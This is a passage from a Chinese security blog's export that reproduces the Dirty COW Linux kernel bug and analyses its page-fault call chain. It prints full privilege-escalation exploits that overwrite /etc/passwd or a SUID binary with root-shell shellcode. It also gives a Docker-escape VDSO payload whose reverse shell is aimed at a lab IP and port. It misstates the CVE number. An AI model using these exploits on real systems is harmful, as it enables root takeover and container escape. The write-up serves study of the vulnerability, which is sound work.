原理与实现](https://zhuanlan.zhihu.com/p/330515575)\n\n[IO - filemap - 1 Bufferd IO](https://lostjeffle.bitcron.com/post/blog/mweb/docs/16017984652324)\n","categories":["经典内核漏洞复现"]},{"title":"基于 dirtycow 的几种提权思路","url":"/2023/05/02/230501-dirtycow-to-root/","content":"\n\n\n\n[官方](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)收集了多种基于dirtycow的利用exp并做了分类，提权需要考虑以下两个方面：\n\n1. 如何产生COW\n   - 写/proc/self/mem\n   - fork/clone后PTACE_POKEDATA\n\n2. 找哪个只读文件\n   - 带suid的可执行程序，如/usr/bin/passwd\n   - 特殊的只读文件，如/etc/passwd\n   - 公用的一些库，如libc，vdso\n\n\n\n# 利用/etc/passwd提权\n\n## exp分析\n\n[ngaro的exp](https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2) 通过/proc/self/mem产生COW，修改/etc/passwd文件中当前用户的uid完成提权，代码逻辑分析如下：\n\n```c\n#include <stdio.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <pthread.h>\n#include <unistd.h>\n#include <sys/stat.h>\n#include <string.h>\n#include <stdint.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <pwd.h>\n\nvoid *map;\nint f;\nstruct stat st;\nchar *name;\n\nvoid *madviseThread(void *arg)\n{\n  char *str;\n  str=(char*)arg;\n  int i,c=0;\n  for(i=0;i<100000000;i++)\n  {\n    c+=madvise(map,100,MADV_DONTNEED);\n  }\n  printf(\"madvise %d\\n\\n\",c);\n}\nvoid *procselfmemThread(void *arg)\n{\n  char *str;\n  str=(char*)arg;\n  int f=open(\"/proc/self/mem\",O_RDWR);\n  int i,c=0;\n  for(i=0;i<100000000;i++) {\n    lseek(f,(uintptr_t) map,SEEK_SET);\n    c+=write(f,str,strlen(str));\n  }\n  printf(\"procselfmem %d\\n\\n\", c);\n}\nint main(int argc,char *argv[])\n{\n  pthread_t pth1,pth2;\n  name=strdup(\"/etc/passwd\");\n  /*\n  \t打开/etc/passwd文件，复制其内容到towrite指向的堆块\n  */\n  f=open(name,O_RDONLY);\t\t\t\n  fstat(f,&st);\n  char* towrite=malloc(st.st_size+1);\n  read(f, towrite, st.st_size);\n  towrite[st.st_size]=0;\n  close(f);\n  /*\n  \t在towrite堆块中，将当前用户的uid位置改成0。由于改完之后passwd文件长度比源文件短，所以需要将后几个字节用'\\n'覆盖\n  */\n  char *attackline; char *exploitedline;\n  struct passwd *attacker=getpwuid(getuid());\t\t// 根据传入的用户ID返回指向passwd的结构体\n  asprintf(&attackline,\"%s:%s:%d:%d:%s:%s:%s\",attacker->pw_name,attacker->pw_passwd,attacker->pw_uid, attacker->pw_gid,attacker->pw_gecos,attacker->pw_dir,attacker->pw_shell);\n  asprintf(&exploitedline,\"%s:%s:0:%d:%s:%s:%s\",attacker->pw_name,attacker->pw_passwd, attacker->pw_gid,attacker->pw_gecos,attacker->pw_dir,attacker->pw_shell);\n  char *endoffile=strstr(towrite,attackline)+strlen(attackline);\n  char *changelocation=strstr(towrite,attackline); \n  int oldfilelen=strlen(towrite);\n  sprintf(changelocation,\"%s%s\",exploitedline,endoffile);\n  int linediff=strlen(attackline)-strlen(exploitedline);\n  int i; for(i=oldfilelen; i>oldfilelen-linediff; i--) towrite[i-1]='\\n';\n\n  f=open(name,O_RDONLY);\t\t\t// 只读模式打开/etc/passwd\n  fstat(f,&st);\n\n  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);\n  printf(\"mmap %zx\\n\\n\",(uintptr_t) map);\n    \n  pthread_create(&pth1,NULL,madviseThread,name);   \n  pthread_create(&pth2,NULL,procselfmemThread,towrite);\t\t\t// 用towrite堆块内容覆盖原/etc/passwd，使当前用户uid变为0，达到提权目的\n\n  pthread_join(pth1,NULL);\n  pthread_join(pth2,NULL);\n  return 0;\n}\n```\n\n\n\n## exp验证\n\n环境准备：下载老版本 [ubuntu-server 14.04.5](https://link.juejin.cn/?target=http%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F14.04.0%2Fubuntu-14.04.5-server-amd64.iso) 镜像并安装到虚拟机\n\n```\ngcc dirty.c -lpthread -o dirty\n./dirty\n```\n\n执行完成后，重启linux。以普通用户登录，可以拿到root shell。\n\n![image-20230502015044932](image-20230502015044932.png?size=600)\n\n\n\n\n\n# 利用/usr/bin/passwd提权\n\n## exp分析\n\n[rverton的exp](https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679) 通过/proc/self/mem产生COW，修改带SUID位的二进制程序/usr/bin/passwd完成提权，代码逻辑分析如下：\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <pthread.h>\n#include <string.h>\n#include <unistd.h>\n\nvoid *map;\nint f;\nint stop = 0;\nstruct stat st;\nchar *name;\npthread_t pth1,pth2,pth3;\n\n// 使用前需确认该SUID程序是可读的\nchar suid_binary[] = \"/usr/bin/passwd\";\n\n/*\n* 通过msfvenom生成的64位架构shellcode\n* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i\n*/ \nunsigned char sc[] = {\n  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,\n  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,\n  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,\n  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,\n  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05\n};\nunsigned int sc_len = 177;\n\n/*\n* 通过msfvenom生成的32位架构shellcode\n* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i\nunsigned char sc[] = {\n  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,\n  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,\n  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,\n  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,\n  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,\n  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,\n  0x89, 0xe1, 0xcd, 0x80\n};\nunsigned int sc_len = 136;\n*/\n\nvoid *madviseThread(void *arg)\n{\n    char *str;\n    str=(char*)arg;\n    int i,c=0;\n    for(i=0;i<1000000 && !stop;i++) {\n        c+=madvise(map,100,MADV_DONTNEED);\n    }\n    printf(\"thread stopped\\n\");\n}\n\nvoid *procselfmemThread(void *arg)\n{\n    char *str;\n    str=(char*)arg;\n    int f=open(\"/proc/self/mem\",O_RDWR);\n    int i,c=0;\n    for(i=0;i<1000000 && !stop;i++) {\n        lseek(f,map,SEEK_SET);\n        c+=write(f, str, sc_len);\n    }\n    printf(\"thread stopped\\n\");\n}\n\nvoid *waitForWrite(void *arg) {\n    char buf[sc_len];\n\n    for(;;) {\n        FILE *fp = fopen(suid_binary, \"rb\");\n\n        fread(buf, sc_len, 1, fp);\n\n        if(memcmp(buf, sc, sc_len) == 0) {\t\t\t// 比较当前读出的/usr/bin/passwd文件内容是否被改成了shellcode，如果是，就退出for循环\n            printf(\"%s overwritten\\n\", suid_binary);\n            break;\n        }\n\n        fclose(fp);\n        sleep(1);\n    }\n\n    stop = 1;\n\n    printf(\"Popping root shell.\\n\");\n    printf(\"Don't forget to restore /tmp/bak\\n\");\n\n    system(suid_binary);\t\t\t// 执行被更改的SUID程序，即可获得root shell\n}\n\nint main(int argc,char *argv[]) {\n    char *backup;\n\n    printf(\"DirtyCow root privilege escalation\\n\");\n    printf(\"Backing up %s to /tmp/bak\\n\", suid_binary);\n\n    asprintf(&backup, \"cp %s /tmp/bak\", suid_binary);\n    system(backup);\t\t\t\t// 将原始的/usr/bin/passwd做一个备份，方便后续恢复\n\n    f = open(suid_binary,O_RDONLY);\t\t// 打开目标二进制程序文件/usr/bin/passwd\n    fstat(f,&st);\n\n    printf(\"Size of binary: %d\\n\", st.st_size);\n\n    char payload[st.st_size];\n    memset(payload, 0x90, st.st_size);\t\t// 根据程序文件大小来设置payload的大小，用0x90(nop)进行填充\n    memcpy(payload, sc, sc_len+1);\t\t\t// 将shellcode拷贝到payload中\n\n    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);\n\n    printf(\"Racing, this may take a while..\\n\");\n\n    pthread_create(&pth1, NULL, &madviseThread, suid_binary);\t     // 此线程为了触发漏洞\n    pthread_create(&pth2, NULL, &procselfmemThread, payload);\t\t// 此线程负责用payload覆盖/usr/bin/passwd\n    pthread_create(&pth3, NULL, &waitForWrite, NULL);\t\t\t// 此线程等待/usr/bin/passwd被写成功后，获取root shell\n\n    pthread_join(pth3, NULL);\n\n    return 0;\n}\n```\n\n\n\n## exp验证\n\n环境准备：下载老版本 [ubuntu-server 14.04.5](https://link.juejin.cn/?target=http%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F14.04.0%2Fubuntu-14.04.5-server-amd64.iso) 镜像并安装到虚拟机\n\n```\ngcc dirty.c -lpthread -o dirty\n./dirty\n```\n\n执行完成后，立刻拿到root shell。\n\n![image-20230502021331361](image-20230502021331361.png?size=600)\n\n\n\n\n\n# 利用VDSO完成docker逃逸\n\n如何将dirtycow应用在docker逃逸中呢？scumjr给出了一个基于VDSO的逃逸方案。\n\nVDSO是内核的一个共享库，它被映射给了用户态使用，用户空间中它的权限是rx。而docker使用的就是宿主机host的内核，也就是说VDSO是连通docker和host的一个公共组件，如果这个组件代码段被docker利用漏洞更改，那么就会影响到宿主机host，进而达到docker逃逸的目的。\n\n## exp分析\n\n> 参考文章：\n>\n> - [脏牛漏洞-Docker逃逸POC(dirtycow-vdso)代码分析](https://blog.csdn.net/enjoy5512/article/details/53196047)\n\n[scumjr的exp](https://github.com/scumjr/dirtycow-vdso) 通过ptrace子进程的方式产生COW，修改vdso中代码段位置（`clock_gettime()`函数）完成提权。利用代码分为两个部分：\n\n1. 利用代码逻辑：[0xdeadbeef.c - 带注释](0xdeadbeef.c)\n\n   - 主要操作：\n\n     - 解析传入的ip:port\n\n     - 准备payload\n\n     - vdso中有两处需要patch（如下图红色部分），准备vdso_patch\n\n       ![image-20230428190409281](image-20230428190409281.png)\n\n     - dirtycow + ptrace完成对VDSO的写入\n\n2. payload汇编：payload.s\n   - 功能：判断请求来自docker还是host，如果来自host（且是root进程调用的，且无/tmp/.x文件，表示从未执行过反弹shell的代码）则反弹shell到目标`ip:port`\n   - 使用：`nasm -f bin -o payload payload.s` , `xxd -i payload payload.h`\n   - 生成的payload.h如下：\n\n```c\nunsigned char payload[] = {\n  0x57, 0x56, 0x52, 0x51, 0xb8, 0x66, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,\n  0x85, 0xc0, 0x0f, 0x85, 0xbb, 0x00, 0x00, 0x00, 0xe8, 0xc9, 0x00, 0x00,\n  0x00, 0x48, 0x8d, 0x74, 0x24, 0xf0, 0xba, 0x10, 0x00, 0x00, 0x00, 0xb8,\n  0x59, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x39, 0xd0, 0x0f, 0x85, 0x9c,\n  0x00, 0x00, 0x00, 0x48, 0x83, 0xc7, 0x0f, 0x48, 0x89, 0xd1, 0xf3, 0xa6,\n  0x0f, 0x85, 0x8d, 0x00, 0x00, 0x00, 0x48, 0xbe, 0x2f, 0x74, 0x6d, 0x70,\n  0x2f, 0x2e, 0x78, 0x00, 0x56, 0x48, 0x89, 0xe7, 0xbe, 0xc0, 0x00, 0x00,\n  0x00, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x5e,\n  0x78, 0x6d, 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0,\n  0x75, 0x61, 0x48, 0x31, 0xf6, 0xf7, 0xe6, 0x48, 0xff, 0xc6, 0x6a, 0x02,\n  0x5f, 0x04, 0x29, 0x0f, 0x05, 0x50, 0x5f, 0x52, 0x52, 0xc7, 0x44, 0x24,\n  0x04, 0xde, 0xc0, 0xad, 0xde, 0x66, 0xc7, 0x44, 0x24, 0x02, 0x37, 0x13,\n  0xc6, 0x04, 0x24, 0x02, 0x54, 0x5e, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58,\n  0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x25, 0x48, 0x31, 0xc0, 0x6a, 0x03,\n  0x5e, 0xff, 0xce, 0xb0, 0x21, 0x0f, 0x05, 0x75, 0xf8, 0x56, 0x5a, 0x56,\n  0x48, 0xbf, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x57, 0x54,\n  0x5f, 0x48, 0x31, 0xc0, 0xb0, 0x3b, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0xb0,\n  0x3c, 0x0f, 0x05, 0x59, 0x5a, 0x5e, 0x5f, 0x58, 0x90, 0x90, 0x90, 0x90,\n  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xff, 0xe0, 0x48, 0x8d,\n  0x3d, 0x01, 0x00, 0x00, 0x00, 0xc3, 0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f,\n  0x31, 0x2f, 0x6e, 0x73, 0x2f, 0x70, 0x69, 0x64, 0x00, 0x70, 0x69, 0x64,\n  0x3a, 0x5b, 0x34, 0x30, 0x32, 0x36, 0x35, 0x33, 0x31, 0x38, 0x33, 0x36,\n  0x5d\n};\nunsigned int payload_len = 265;\n```\n\n\n\n## exp验证\n\n> ubuntu14.04.3-desktop中验证失败（prologue的问题，改一下可以成），ubuntu14.04.5-server中验证成功\n\n> 参考文章：\n>\n> - [Docker逃逸--脏牛漏洞POC测试](https://juejin.cn/post/6950955315751813134)\n\n搭建实验环境及exp验证步骤如下：\n\n1. 下载老版本 [ubuntu-server 14.04.5](https://link.juejin.cn/?target=http%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F14.04.0%2Fubuntu-14.04.5-server-amd64.iso) 镜像并安装：\n\n2. 安装好docker及docker-compose\n\n   ```bash\n   $ sudo apt-get install libltdl7 libsystemd-journal0\n   $ wget https://download.docker.com/linux/ubuntu/dists/trusty/pool/stable/amd64/docker-ce_17.03.0~ce-0~ubuntu-trusty_amd64.deb\n   $ sudo dpkg -i docker-ce_17.03.0_ce-0_ubuntu-trusty_amd64.deb\n   $ sudo curl -L https://github.com/docker/compose/releases/download/1.21.0/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose\n   $ sudo chmod +x /usr/local/bin/docker-compose\n   ```\n\n3. 设置容器环境\n\n   ```bash\n   $ git clone https://github.com/gebl/dirtycow-docker-vdso.git\n   $ cd dirtycow-docker-vdso/\n   $ sudo docker-compose run dirtycow /bin/bash\n   ```\n\n4. 进入容器，编译poc并执行\n\n   ```bash\n   $ cd /dirtycow-vdso/\n   $ make\n   $ ./0xdeadbeef 192.168.133.128:1234\n   ```\n\n5. 查看是否成功接收到反弹shell\n\n   ![image-20230428151541933](image-20230428151541933.png?size=600)\n\n\n\n## 拓展\n\nRWCTF 2023中有一道题是关于dirtycow的，叫做\"Be a Docker Escaper 3\"。[官方给出的WP](https://mp.weixin.qq.com/s/PHdDA0iQXm7e8aByHdxcQA)中指出，这个题目跟上文scumjr的利用有两点差异：\n\n1. 最新版docker中禁用了ptrace。所以得考虑通过`/proc/self/mem`产生COW完成利用，那么就有许多代码逻辑要改\n2. 题目环境中vdso的构造跟scumjr不一样。所以需要人工定位一下`clock_gettime()`地址，可以写死在代码逻辑中\n\n出题人给了它的exp：[exploit for dirtycow](https://github.com/zh-explorer/dirtycow)\n\n\n\n# 知识点\n\n\n\n## 什么是vdso\n\n>  参考文章：\n>\n> - [Linux vDSO概述](https://zhuanlan.zhihu.com/p/436454953)\n>\n> - [人见人爱的vDSO机制，如今也靠不住了](https://cloud.tencent.com/developer/article/1073909)\n\n### 先有vsyscall\n\nvsyscall区域位于内核地址空间，它是唯一允许用户访问的区域。该区域地址固定为0xffffffffff600000，大小固定为4K。所有进程都共享内核映射。但是它有两个缺点，导致开发人员抛弃了vsyscall机制：\n\n1. vsyscall映射地址固定不变，使攻击者很容易利用它当跳板（在x86_64上通过emulated vsyscall机制，借助vvar mapping可一定程度上缓解该问题，但性能不如vsyscall native）\n2. vsyscall支持的系统调用数量有限，无法方便地扩展\n\nvsyscall中支持的三个系统调用：\n\n- gettimeofday()\n- time()\n- getcpu()\n\n![image-20230426180135721](image-20230426180135721.png?size=600)\n\n\n\n### 再有vdso\n\n鉴于vsyscall的缺点，开发人员设计了VDSO机制来取代vsyscall。\n\nVDSO的定义：\n\n```\nThe \"vDSO\" (virtual dynamic shared object) is a small shared library\nthat the kernel automatically maps into the address space of all user-space applications.  Applications usually do not need to concern themselves with these details as the vDSO is most commonly called by the C library.  This way you can code in the normal way using standard functions and the C library will take care of using any functionality that is available via the vDSO.\n（VDSO是内核的一个共享库（代码段），它被映射给了用户态使用）\n```\n\nVDSO与vsyscall的区别：\n\n1. VDSO本质上是一个ELF共享目标文件，而vsyscall只是一段内存代码和数据\n2. vsyscall位于内核地址空间，采用静态地址映射方式；而VDSO借助共享目标文件天生具有PIC特性，可以以进程为粒度动态映射到进程地址空间中。\n\n为了兼容老旧程序，vsyscall机制（native模式和emulation模式）仍旧被保留下来。所以`cat /proc/self/maps`时可以同时看到vvar，vdso，vsyscall三种特殊的mapping。\n\n### 导出vdso\n\n为了更直观地看到VDSO，我们有两种方法将其导出：\n\n1. 在gdb中导出vdso\n\n   ```\n   dumpmem vdso.so 0x00007ffff7ffa000 0x00007ffff7ffc000\n   ```\n\n2. 写个c程序导出vdso\n\n   ```c\n   #include <err.h>\n   #include <stdio.h>\n   #include <fcntl.h>\n   #include <stdlib.h>\n   #include <unistd.h>\n   #include <sys/auxv.h>\n   #include <sys/mman.h>\n   \n   \n   static unsigned long get_vdso_addr(void)\n   {\n   \treturn getauxval(AT_SYSINFO_EHDR);\t\t\t// 获取VDSO的地址\n   }\n   \n   int main(int argc, char *argv[])\n   {\n   \tunsigned long vdso_addr;\n   \tint fd;\n   \n   \tvdso_addr = get_vdso_addr();\n   \tprintf(\"[*] vdso addr: %016lx\\n\", vdso_addr);\n   \n   \tfd = open(argv[1], O_CREAT|O_TRUNC|O_WRONLY, 0644);\n   \tif (fd == -1)\n   \t\terr(1, \"open\");\n   \n   \twrite(fd, (void *)vdso_addr, 0x2000);\n   \n   \treturn 0;\n   }\n   ```\n\n   \n","categories":["经典内核漏洞复现"]},{"title":"经典内核漏洞复现之 dirtycow","url":"/2023/05/02/230501-dirtycow-analysis/","content":"\n\n\n# dirtycow漏洞分析\n\nCVE-2016-9159（dirtycow）受影响的内核版本：linux 2.6.22 ~ [patched kernel versions](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions)\n\n[dirtycow](https://dirtycow.ninja/)这个漏洞的原理比较复杂，但[官方exp](https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c)非常简单。所以从exp入手探索背后的漏洞原理。\n\n先简单描述一下这个漏洞做了什么：\n\n对一个只读的**私有映射**（且是**文件映射**）的页面进行写操作（通过/proc/self/mem写）时，会触发copy-on-write，将page cache中的内容拷贝到cow页面。\n\n- 正常情况下，写的是cow页面，不会同步到磁盘文件。\n- 然而dirtycow漏洞可以直接映射page cache页面并写入，原本的**只读文件被改写**了。（可以改[/etc/passwd](https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2)或[带suid位的程序](https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679)来提权）\n\n# exp分析\n\n产生COW的方式有两种，[一种](https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c)是写/proc/self/mem文件，[另一种](https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c)是通过PTRACE_POKEDATA跨进程写。\n\n这里以比较经典的前者作为分析对象（前者分析明白了，后者也就能理解了），exp如下：\n\n```c\n#include <stdio.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <pthread.h>\n#include <unistd.h>\n#include <sys/stat.h>\n#include <string.h>\n#include <stdint.h>\n\nvoid *map;\nint f;\nstruct stat st;\nchar *name;\n \nvoid *madviseThread(void *arg)\n{\n  char *str;\n  str=(char*)arg;\n  int i,c=0;\n  for(i=0;i<100000000;i++)\n  {\n    c+=madvise(map,100,MADV_DONTNEED);\t\t// 竞争点：释放map对应物理页，清空页表\n  }\n  printf(\"madvise %d\\n\\n\",c);\n}\n \nvoid *procselfmemThread(void *arg)\n{\n  char *str;\n  str=(char*)arg;\n\n  int f=open(\"/proc/self/mem\",O_RDWR);\t\t// 打开/proc/self/mem文件\n  int i,c=0;\n  for(i=0;i<100000000;i++) {\n    lseek(f,(uintptr_t) map,SEEK_SET);\t\t// 定位到map位置\n    c+=write(f,str,strlen(str));\t\t\t// 竞争点：往map位置写传入的字符串\n  }\n  printf(\"procselfmem %d\\n\\n\", c);\n}\n \n \nint main(int argc,char *argv[])\n{\n  if (argc<3) {\n  (void)fprintf(stderr, \"%s\\n\",\n      \"usage: dirtyc0w target_file new_content\");\n  return 1; }\n  pthread_t pth1,pth2;\n\n  f=open(argv[1],O_RDONLY);\t\t// argv[1]是待写的只读文件的文件名\n  fstat(f,&st);\n  name=argv[1];\n\n  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);\t\t// 将文件映射到进程内存中\n  printf(\"mmap %zx\\n\\n\",(uintptr_t) map);\n\n  pthread_create(&pth1,NULL,madviseThread,argv[1]);\t\t\t// 释放映射关系的线程\n  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);\t\t// 写线程，argv[2]是待写入的字符串\n    \n  pthread_join(pth1,NULL);\n  pthread_join(pth2,NULL);\n  return 0;\n}\n```\n\n\n\n# 调用链分析\n\n> 跟dirtycow漏洞相关的代码，主要集中在三个文件，这里打包保存一下：[dirtycow_src](dirtycow_src.zip)，根据网上资料和自己的理解加了注释，方便后续回顾更改。\n\n对`/proc/self/mem`文件的读写操作，对应到fd/proc/base.c文件中的proc_mem_operations\n\n```c\nstatic const struct file_operations proc_mem_operations = {\n\t.llseek\t\t= mem_lseek,\n\t.read\t\t= mem_read,\n\t.write\t\t= mem_write,\n\t.open\t\t= mem_open,\n\t.release\t= mem_release,\n};\n```\n\ndirtycow的利用中，使用的是往`/proc/self/mem`文件写，对应到内核的处理函数为`mem_write()`，因此我们跟着它一步步分析，梳理出函数调用链：\n\n```c\nmem_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos)\n  mem_rw(file, (char __user*)buf, count, ppos, 1);\n    access_remote_vm(mm, addr, page, this_len, write);\n      __access_remote_vm(NULL, mm, addr, buf, len, write);\n        get_user_pages_remote(tsk, mm, addr, 1, write, 1, &page, &vma);\n          __get_user_pages_locked(tsk, mm, start, nr_pages, write, force, pages, vmas, NULL, false,FOLL_TOUCH | FOLL_REMOTE);\n            __get_user_pages(tsk, mm, start, nr_pages, flags, pages, vmas, locked);\n              find_extend_vma(mm, start);\t\t\t\t// 查找vma\n              follow_page_mask(vma, start, foll_flags, &page_mask);\t\t// 重点\n              faultin_page(tsk, vma, start, &foll_flags, nonblocking);\t\t// 重点\n```\n\n`follow_page_mask()`：查询页表获取虚拟地址对应的物理页，如果返回NULL则调用`faultin_page()`进行缺页处理。有两种情况会返回NULL，导致触发`faultin_page()`函数：\n\n1. 页表中不存在物理页即缺页\n2. 访问语义标志foll_flags对应的权限违反内存页的权限时\n\n以上两种情况再dirtycow的利用中都会发生，因此`follow_page_mask()`和`faultin_page()`两个函数会被反复调用。接下来，我们按照时间先后顺序，分析这它们更深层次的函数调用过程。\n\n刚开始分析内核的同学可以结合 [xuanxuan博客](https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/#漏洞原理详解) 中的图片来理解，画的非常棒！\n\n## 第一次\n\n> 第一次进 `follow_page_mask()`，由于页表项和页表都是空的，所以返回NULL，触发`faultin_page()`进行缺页错误处理。\n>\n> `faultin_page()`中，根据访问flags（FOLL_WRITE）和mmap类型（VM_PRIVATE，文件映射），在物理内存上将page_cache做了一份拷贝（COW）。并使用后者建立页表，映射给进程使用。\n\n `follow_page_mask()`函数中调用链如下：\n\n```c\nfollow_page_mask(vma, start, foll_flags, &page_mask);\n  pgd_offset(mm, address);\n  pud_offset(pgd, address);\n  pmd_offset(pud, address);\t\t\t// 依次解析各级页目录表，如果某级页目录表为空，会直接返回NULL\n  follow_page_pte(vma, address, pmd, flags);\n  \tpte_offset_map_lock(mm, pmd, address, &ptl);\n  \tpte_present(pte);\t\t\t// 第一次进时，页不在内存中，且页表项为空\n  \tif (!pte_none(pte))\n\t\treturn NULL;\n```\n\n以上函数返回后，会立即进入`faultin_page()`进行缺页错误处理：\n\n```c\nfaultin_page(tsk, vma, start, &foll_flags, nonblocking);\n  handle_mm_fault(mm, vma, address, fault_flags);\n    __handle_mm_fault(mm, vma, address, flags);\n      pgd_offset(mm, address);\n      pud_alloc(mm, pgd, address);\n      pmd_alloc(mm, pud, address);\n      pte_alloc(mm, pmd, address)\n      pte_offset_map(pmd, address);\t\t\t// 如果各级页目录项为空，则依次申请和设置\n      handle_pte_fault(mm, vma, address, pte, pmd, flags);\n        do_fault(mm, vma, address, pte, pmd, flags, entry);\n    \t  do_cow_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);\t\t// 写时复制的映射\n    \t    alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);\n    \t    __do_fault(vma, address, pgoff, flags, new_page, &fault_page);\t\t// 将文件内容读到fault_page对应的页中，然后再将fault_page的内容拷贝到new_page中，相当于cow（new_page是副本）\n    \t    copy_user_highpage(new_page, fault_page, address, vma);\n    \t    pte_offset_map_lock(mm, pmd, address, &ptl);\n    \t    do_set_pte(vma, address, new_page, pte, true, true);\t// 将new_page设置到页表项中，建立new_page到address地址的映射\n    \t      mk_pte(page, vma->vm_page_prot);\n    \t      maybe_mkwrite(pte_mkdirty(entry), vma);\t\t// 设置页面为dirty，但仍保持页面为RO\t\t\n    \t      // if (likely(vma->vm_flags & VM_WRITE))\n\t\t\t  //\t\tpte = pte_mkwrite(pte);\n\t\t\t  page_add_new_anon_rmap(page, vma, address, false);\n\t\t\t  set_pte_at(vma->vm_mm, address, pte, entry);\n    \t    lru_cache_add_active_or_unevictable(new_page, vma);\n  \n```\n\n`do_cow_fault()`函数会返回0，回到`__get_user_pages()`函数中的retry标签处，再次执行`follow_page_mask()`和`faultin_page()`\n\n```c\nretry:\n\t\tif (unlikely(fatal_signal_pending(current)))\n\t\t\treturn i ? i : -ERESTARTSYS;\n\t\tcond_resched();\n\t\tpage = follow_page_mask(vma, start, foll_flags, &page_mask);\t\t\t// 查询页表获取虚拟地址对应的物理页\n\t\tif (!page) {\n\t\t\tint ret;\n\t\t\tret = faultin_page(tsk, vma, start, &foll_flags,\t\t\t\t// 缺页处理函数\n\t\t\t\t\tnonblocking);\n\t\t\tswitch (ret) {\n\t\t\tcase 0:\n\t\t\t\tgoto retry;\n```\n\n\n\n## 第二次\n\n> 第二次进入`follow_page_mask()`函数，此时页表和映射关系已建立好，但由于页表标记位是read 